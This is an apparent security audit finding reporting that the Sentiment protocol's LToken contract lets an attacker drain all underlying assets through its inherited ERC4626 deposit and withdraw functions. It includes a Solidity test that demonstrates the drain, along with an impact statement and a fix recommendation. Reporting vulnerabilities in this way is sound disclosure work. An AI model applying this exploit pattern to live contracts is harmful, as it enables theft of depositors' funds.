Ruhum
# Attacker can steal LToken's underlying asset

## Summary
The attacker can abuse the inherited ERC4626 contract to steal the LToken's underlying asset.

## Vulnerability Detail
The attacker deposits assets through the ERC4626 interface to receive shares. Normal operations of the LToken contract don't involve the ERC4626 native shares. None are minted when users borrow or repay tokens. Thus, under normal circumstances, the attacker is the only one who has shares. Since they control 100% of the shares, they can redeem these shares to withdraw all the underlying assets.

Here's a test showcasing the issue:

```sol
// protocol/src/test/tokens/LToken.t.sol

    function testAttack() public {
        // normal lending stuff copied from another test:
        erc20.mint(address(lErc20), 100e18);

        cheats.prank(address(accountManager));
        // 1e18 tokens are lent to "account"
        lErc20.lendTo(account, 1e18);

        uint borrowBalance = lErc20.getBorrowBalance(account);
        // Assert
        assertEq(borrowBalance, 1e18);

        // attacker deposits into the LToken contract so they get ERC4626 shares
        // so first give the attacker some liqudidity, e.g. 1e18
        address attacker = cheats.addr(10);
        erc20.mint(attacker, 1e18);
        cheats.prank(attacker);
        erc20.approve(address(lErc20), 1e18);
        cheats.prank(attacker);
        lErc20.deposit(1e18, attacker);


        // at this point, there's 100e18 tokens inside the LToken contract.
        // 1e18 tokens are lent to "account".
        // Because the attacker is the only one who has ERC4626 shares he can redeem them to
        // withdraw all the assets inside the contract
        assertEq(erc20.balanceOf(attacker), 0);

        cheats.prank(attacker);
        lErc20.withdraw(100e18, attacker, attacker);

        assertEq(erc20.balanceOf(attacker), 100e18);
    }
```

## Impact
All the underlying assets of LToken contracts can be stolen.

## Code Snippet
No shares are minted when a user borrows or repays tokens: https://github.com/sentimentxyz/protocol/blob/4e45871e4540df0f189f6c89deb8d34f24930120/src/tokens/LToken.sol#L128-L165

User can freely call the native ERC4626 functions: https://github.com/sentimentxyz/protocol/blob/4e45871e4540df0f189f6c89deb8d34f24930120/src/tokens/utils/ERC4626.sol#L48-L117

## Tool used

Manual Review

## Recommendation
The ERC4626 integration here is weird. You don't use any of its functions. Instead, you built something different around it. For example, instead of issuing the ERC4626 shares, you create your own internal accounting of custom shares: https://github.com/sentimentxyz/protocol/blob/4e45871e4540df0f189f6c89deb8d34f24930120/src/tokens/LToken.sol#L137-L140

I don't see the benefit of using ERC4626 in this case. Either remove it or use the native functions.
